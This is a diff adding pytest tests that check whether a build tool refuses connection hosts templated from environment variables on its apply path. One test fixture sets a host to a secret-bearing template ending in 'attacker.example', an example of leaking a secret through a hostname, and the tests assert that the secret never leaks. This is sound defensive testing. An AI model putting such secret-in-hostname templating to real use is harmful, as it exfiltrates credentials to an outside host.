@@ -508,3 +508,57 @@ def test_an_unset_variable_in_a_catalog_host_is_refused_by_name(
     shown = capsys.readouterr()
     assert "CATALOG_HOST" in shown.out + shown.err and "not set or empty" in shown.out + shown.err
     assert pushed() in ("{}", "[]", "")
+
+
+def _dispatch_as_run_builds_does(contract: Dict[str, Any], tmp_path: Path, *, plan: bool) -> int:
+    """Through the arguments ``run_builds_from_args`` passes: the contract as written beside the
+    one it runs. A plan's contract is rendered before it gets there (``plan=True``)."""
+    import copy
+
+    from fluid_build._contract_loader import resolve_contract_env_templates
+    from fluid_build.build_runners.base import _execute_acquisition_build
+
+    running = resolve_contract_env_templates(copy.deepcopy(contract)) if plan else contract
+    return _execute_acquisition_build(
+        running["builds"][0], running, tmp_path, dry_run=False, as_written=contract
+    )
+
+
+@pytest.mark.parametrize("plan", [False, True], ids=["yaml-contract", "plan-contract"])
+def test_a_host_in_the_build_is_refused_on_the_path_apply_runs(
+    sink_engine, tmp_path: Path, monkeypatch, capsys, caplog, plan
+):
+    """``run_builds_from_args`` always passes the contract as written, so the build's own fields
+    (``source.connection.host``, the sink) are judged there too: the check once looked at them
+    only when nothing was passed as written, which is never."""
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("OPERATOR_SYNTH_SECRET", _PROBE)
+    contract = contract_for(_catalog("https://lakekeeper:8443/catalog"))
+    connection = contract["builds"][0]["properties"]["source"]["connection"]
+    connection["host"] = "{{ env.OPERATOR_SYNTH_SECRET }}.attacker.example"
+
+    with caplog.at_level(logging.DEBUG):
+        rc = _dispatch_as_run_builds_does(contract, tmp_path, plan=plan)
+
+    shown = capsys.readouterr()
+    everything = shown.out + shown.err + caplog.text
+    assert rc == 1
+    assert "OPERATOR_SYNTH_SECRET" in everything and "source.connection.host" in everything
+    assert _PROBE not in everything and _PROBE not in pushed()
+
+
+@pytest.mark.parametrize("plan", [False, True], ids=["yaml-contract", "plan-contract"])
+def test_an_unpaired_host_variable_in_the_build_is_refused_on_the_path_apply_runs(
+    sink_engine, tmp_path: Path, monkeypatch, capsys, plan
+):
+    contract_for, pushed = sink_engine
+    monkeypatch.setenv("SRC_PREFIX", "internal")
+    monkeypatch.delenv(SECRET_REF_ALLOWLIST, raising=False)
+    contract = contract_for(_catalog("https://lakekeeper:8443/catalog"))
+    connection = contract["builds"][0]["properties"]["source"]["connection"]
+    connection["host"] = "{{ env.SRC_PREFIX }}.db.example"
+
+    assert _dispatch_as_run_builds_does(contract, tmp_path, plan=plan) == 1
+    shown = capsys.readouterr()
+    assert "SRC_PREFIX" in shown.out + shown.err
+    assert "internal" not in shown.out + shown.err, "never the rendered host"
